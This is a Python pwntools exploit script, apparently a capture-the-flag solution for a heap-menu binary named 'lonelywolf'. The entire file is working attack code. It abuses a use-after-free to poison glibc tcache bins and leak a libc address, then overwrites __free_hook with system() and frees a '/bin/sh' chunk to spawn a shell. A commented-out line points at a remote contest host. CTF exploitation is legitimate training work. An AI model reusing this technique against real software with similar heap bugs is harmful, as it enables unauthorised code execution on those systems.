#!/usr/bin/python
#coding=utf-8
from pwn import *
# context.log_level = 'debug'
# p = remote('124.71.224.30',20944)
elf = ELF('./lonelywolf')
p = elf.process()
# libc = ELF('libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(idx,size):
	p.sendlineafter("choice: ",'1')
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Size: ",str(size))

def edit(idx,payload):
	p.sendlineafter("choice: ",'2')
	p.sendlineafter("Index: ",str(idx))
	p.sendlineafter("Content: ",payload)

def show(idx):
	p.sendlineafter("choice: ",'3')
	p.sendlineafter("Index: ",str(idx))

def delete(idx):
	p.sendlineafter("choice: ",'4')
	p.sendlineafter("Index: ",str(idx))

add(0,0x60)
delete(0)
for i in range(7):
	edit(0,p64(0)*2)
	delete(0)
add(0,0x70)
delete(0)
for i in range(7):
	edit(0,p64(0)*2)
	delete(0)
add(0,0x50)
p.sendlineafter("choice: ",'1'*0x400)
add(0,0x40)
show(0)

p.recvuntil('Content: ')
libc_addr = u64(p.recvuntil('\x7f').ljust(8,'\x00'))-0x3ebd80
libc.address = libc_addr
free_hook = libc.sym['__free_hook']
system = libc.symbols['system']
info('libc_addr: ' + hex(libc_addr))

add(0,0x30)
delete(0)
edit(0,p64(0)*2)
delete(0)
add(0,0x30)
edit(0,p64(free_hook))
add(0,0x30)
add(0,0x30)
edit(0,p64(system))
add(0,0x20)
edit(0,'/bin/sh\n')
delete(0)
p.interactive()